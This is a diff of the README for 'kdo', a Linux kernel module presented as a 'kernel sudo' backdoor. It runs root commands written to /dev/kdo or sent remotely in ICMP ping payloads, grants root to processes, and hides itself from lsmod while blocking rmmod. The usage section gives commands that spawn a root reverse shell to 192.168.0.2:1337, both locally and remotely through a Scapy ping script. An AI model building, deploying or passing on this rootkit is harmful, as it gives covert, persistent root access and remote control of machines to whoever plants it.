@@ -1,16 +1,22 @@
 kdo
 ===
-Kernel sudo. This is a very simple LKM that creates a character device at `/dev/kdo` to which
-commands can be written and executed via `call_usermodehelper`, effectively creating a backdoor for
-unprivileged users. Apart from command execution, other useful builtins are implemented as well.
-Whatever wlse that is written to the character device will be ignored, so feel free to modify the
-default builtin strings to have something like a poor man's authentication mechanism.
+A "kernel sudo". This LKM creates a character device at `/dev/kdo` to which commands can be written
+and executed via `call_usermodehelper`, effectively creating a backdoor  in userland. It also
+registers an ICMP hook using netfilter to receive remote commands via ICMP payloads. Apart from
+command execution, other convenient builtins are implemented as well. Default values can be modified
+in `src/include/config.h`.
+
+A Python script is provided to send the ICMP packet (`src/kdo-ping.py`). [Scapy](https://scapy.net/)
+was used craft it.
 
 
-Builtin Commands
-----------------
-- `kdo-su` \
-Grant root privileges to the current process (set all uids to 0).
+Features
+--------
+- `kdo-exec [argv]` \
+Execute a command via call_usermodehelper.
+
+- `kdo-root` \
+Grant root privileges to the current process (set process ids to 0).
 
 - `kdo-hide` \
 Hide module from `lsmod` and make it impossible to unload with `rmmod`.
@@ -18,39 +24,47 @@ Hide module from `lsmod` and make it impossible to unload with `rmmod`.
 - `kdo-show` \
 Make module visible and removable after running `kdo-hide`.
 
-- `kdo-exec [argv]` \
-Execute [argv] via call_usermodehelper.
-
 
 Installation
 ------------
-**1**. Clone the repository
+**1.** Clone the repository
 ```bash
 git clone https://github.com/hiatus/kdo
 ```
 
-**2**. Build the module
+**2.** Build the module
 ```bash
 cd kdo
 make
 ```
 
-**3**. Insert the module 
+**3.** Insert the module 
 ```
 sudo insmod kdo.ko
 ```
 
 Configuration
 -------------
-Some options can be set in `src/include/config.h`, such as the name of the created device (`kdo` by
-default) and enabling logging (disabled by default).
+Default values can be modified in `src/include/config.h`, such as the name of the created device
+(`kdo` by default), the magic strings for the module's functionalities and the shell to execute
+commands with. Logging can be enabled by defining the `DEBUG` symbol (undefined by default).
 
 
 Usage
 -----
-Simply write to `/dev/kdo`. Because the module treats anything (apart from builtins) as a last
-argument for `/bin/sh -i -c`, redirection and other shell functionalities are supported. For
-example, to send a root reverse shell to `192.168.0.2:12345`, run:
+Simply write to `/dev/kdo` or craft an ICMP request whose payload is a valid `kdo` command string.
+
+Note that because the command execution backend inserts it's arguments as the last parameter for
+`/bin/bash -c` (can be changed, see **Configuration**), shell functionalities such as redirection
+are supported. For example, to spawn a reverse shell to `192.168.0.2:1337`, run in the target
+machine:
+
 ```bash
-echo 'bash -i &> /dev/tcp/192.168.0.2/12345 0>&1' > /dev/kdo
+echo 'kdo-exec bash -i &> /dev/tcp/192.168.0.2/1337 2>&1 0>&1' > /dev/kdo
+```
+
+To do the same thing remotely, send a ping from the attacker side with the same string as payload:
+
+```bash
+sudo python src/kdo-ping.py -t 192.168.0.3 'kdo-exec bash -i &> /dev/tcp/192.168.0.2/1337 2>&1 0>&1'
 ```
